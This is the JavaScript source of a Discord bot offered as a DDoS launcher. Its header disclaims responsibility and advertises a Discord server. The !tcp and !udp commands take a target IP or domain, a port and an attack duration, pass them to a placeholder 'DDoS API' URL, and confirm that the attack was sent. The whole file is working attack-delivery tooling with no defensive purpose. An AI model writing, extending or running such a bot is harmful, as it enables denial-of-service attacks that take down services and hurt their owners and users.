/*
    DDoS (API) Discord Bot made by CrescereDev, using discord.js module version 12.4.1.
    A Discord Bot for DDoS ​​using your own DDoS API, we are not responsible for your action(s).

    Our Discord Server: https://discord.gg/fyf6UspcPs
*/

const Discord = require('discord.js')
const request = require('request');
const { MessageEmbed } = require('discord.js');
const client = new Discord.Client();
const config = require("./config.json");

const prefix = "!";

client.on('ready', () => {
  console.clear()
  console.log(`${client.user.tag} is currently online!`);
});

  client.on("message", async message => {
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();

    if (message.author.bot) {
        return;
    } else if (!message.content.startsWith(prefix)) {
        return;
    } else if (message.channel.type === "dm") {
        return;
    } 

    if (command === "method") {
        let embed = new MessageEmbed()
        .setTitle(`DDoS Method List (My prefix is ${prefix})`)
        .setDescription(
            "**Usage (with prefix): <method> <target ip/domain> <time>**\n\n\ntcp\n```TCP Attack Method```\nudp\n```UDP Attack Method```")
        .setFooter(`Requested by ` + message.author.tag)
        .setTimestamp()
        .setColor("#FF5733")
        message.channel.send(embed)
    }
    else if (command === "tcp") {
        if(!args[0]) return message.channel.send("Please input your target ip address/domain!")
        if(!args[1]) return message.channel.send("Please input port!")
        if(!args[2]) return message.channel.send("Please input attack time!")
        let ip = args[0]
        let port = args[1]
        let time = args[2]
        request(`INSERT API URL with ${ip}, ${port}, and ${time}`, { method: "GET" }, function(error) {
            if (error) message.channel.send("Server send an error, maybe down?");
            else {
                try {
                let embed = new MessageEmbed()
                .setColor(`#FF5733`)
                .setAuthor(`Your command has been requested!"`, "https://cdn.discordapp.com/emojis/727166288614522962.png?v=1")
                .setDescription(`Attack sent to: \n\nIP Address: ${ip}\nPort: ${port}\nTime: ${time}`)
                .setFooter(`Requested by ` + message.author.tag)
                .setTimestamp() 
                message.channel.send(embed)  
                } catch (e) {
                message.channel.send("Server send an error, maybe not working?")
                }
            }
        });
    }
    else if (command === "udp") {
        if(!args[0]) return message.channel.send("Please input your target ip address/domain!")
        if(!args[1]) return message.channel.send("Please input port!")
        if(!args[2]) return message.channel.send("Please input attack time!")
        let ip = args[0]
        let port = args[1]
        let time = args[2]
        request(`INSERT API URL with ${ip}, ${port}, and ${time}`, { method: "GET" }, function(error) {
            if (error) message.channel.send("Server send an error, maybe down?");
            else {
                try {
                let embed = new MessageEmbed()
                .setColor(`#FF5733`)
                .setAuthor(`Your command has been requested!"`, "https://cdn.discordapp.com/emojis/727166288614522962.png?v=1")
                .setDescription(`Attack sent to: \n\nIP Address: ${ip}\nPort: ${port}\nTime: ${time}`)
                .setFooter(`Requested by ` + message.author.tag)
                .setTimestamp() 
                message.channel.send(embed)  
                } catch (e) {
                message.channel.send("Server send an error, maybe not working?")
                }
            }
        });
    } 
});
client.login(config.token);
